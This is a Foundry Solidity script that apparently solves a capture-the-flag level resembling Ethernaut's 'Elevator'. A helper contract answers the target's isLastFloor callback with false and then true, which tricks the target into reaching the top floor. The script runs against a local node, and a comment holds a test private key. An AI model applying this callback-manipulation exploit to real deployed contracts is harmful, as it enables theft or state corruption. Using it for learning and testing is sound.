// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function goTo(uint256 _floor) external;
    function top() external view returns (bool);
}

contract Helper {
    bool flag = false;

    function trigger(address target) public {

        ITarget(target).goTo(23424234234);
    }
    function isLastFloor(uint256) external returns (bool) {
        console.log("Hi~");
        if(!flag)
        {
            flag = true;
            return false;
        }
        return true;
    }
}
contract SolveScript is Script {
    address public target = 0x9bd03768a7DCc129555dE410FF8E85528A4F88b5;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.logBool(ITarget(target).top());
        Helper helper = new Helper();
        helper.trigger(target);
        console.logBool(ITarget(target).top());
        vm.stopBroadcast();
    }
}
